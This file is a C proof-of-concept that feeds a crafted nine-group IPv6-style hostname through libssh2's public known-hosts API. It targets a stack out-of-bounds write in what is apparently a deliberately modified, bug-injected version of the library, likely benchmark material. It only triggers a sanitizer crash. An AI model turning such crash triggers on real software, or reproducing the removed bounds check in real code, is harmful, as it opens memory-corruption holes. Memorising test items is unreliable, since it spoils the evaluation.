/*
 * PoC for a stack out-of-bounds write (CWE-787) in libssh2's known-hosts
 * IPv6-literal matching, reached through the public API.
 *
 * An attacker-influenced hostname that looks like an IPv6 literal with more
 * than eight 16-bit groups is parsed by knownhost_parse_ipv6() into a
 * fixed 8-element stack array. On the resulting (buggy) tree the per-group
 * capacity check has been dropped, so the ninth group is written one element
 * past the array -> ASan aborts.
 *
 * Drives only public <libssh2.h> entry points with in-contract input:
 * no network, no private symbols. Clean on the original batch; aborts under
 * AddressSanitizer on the modified tree.
 */
#include <libssh2.h>
#include <stdio.h>
#include <string.h>

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *hosts;
    /* a base64-encoded key blob is all the matcher needs */
    static const char key[] = "AAAAB3NzaC1yc2EAAAADAQABAAAA";
    const int typemask =
        LIBSSH2_KNOWNHOST_TYPE_PLAIN |
        LIBSSH2_KNOWNHOST_KEYENC_BASE64 |
        LIBSSH2_KNOWNHOST_KEY_SSHRSA;
    /* An attacker-controlled hostname that passes as a plain IPv6-ish
       literal but carries nine groups -- one more than fits. */
    static const char crafted[] = "1:2:3:4:5:6:7:8:9";
    int rc;

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 2;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 2;
    }

    hosts = libssh2_knownhost_init(session);
    if(!hosts) {
        fprintf(stderr, "libssh2_knownhost_init failed\n");
        return 2;
    }

    /* A stored plain entry whose text differs from the crafted name, so the
       check falls through the exact-string fast path into IPv6 parsing. */
    rc = libssh2_knownhost_add(hosts, "example.com", NULL,
                               key, strlen(key), typemask, NULL);
    if(rc) {
        fprintf(stderr, "libssh2_knownhost_add failed: %d\n", rc);
        return 2;
    }

    /* Public-API lookup with the crafted hostname: on the modified tree the
       parser writes past its stack array while comparing addresses. */
    rc = libssh2_knownhost_check(hosts, crafted, key, strlen(key),
                                 typemask, NULL);

    fprintf(stderr, "check returned %d (no overflow detected)\n", rc);

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}
